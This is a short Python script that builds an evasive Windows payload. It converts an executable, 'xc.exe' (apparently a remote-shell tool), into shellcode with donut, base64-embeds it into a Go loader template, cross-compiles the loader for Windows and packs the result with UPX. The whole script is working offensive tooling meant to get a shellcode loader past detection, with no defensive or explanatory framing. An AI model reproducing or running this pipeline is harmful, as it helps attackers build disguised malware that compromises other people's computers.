#!/usr/bin/env python3

import donut
import os
import base64
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 

# generate shellcode
shellcode = donut.create(file="xc.exe")
base64shellcode = base64.b64encode(shellcode)

# place shellcode into load.go
os.system("cp load.go load.go.bak")

with open("load.go") as f:
    temp = f.read().replace('<base64shellcode>',base64shellcode.decode())

with open("load.go", "w") as f:
    f.write(temp)

# compile & cleanup
os.system("GOOS=windows GOARCH=amd64 go build -o xcs.exe load.go")
os.system("rm loader.bin; rm xc.exe")
os.system("upx xcs.exe -o xc.exe")
os.system("cp load.go.bak load.go; rm load.go.bak; rm xcs.exe")
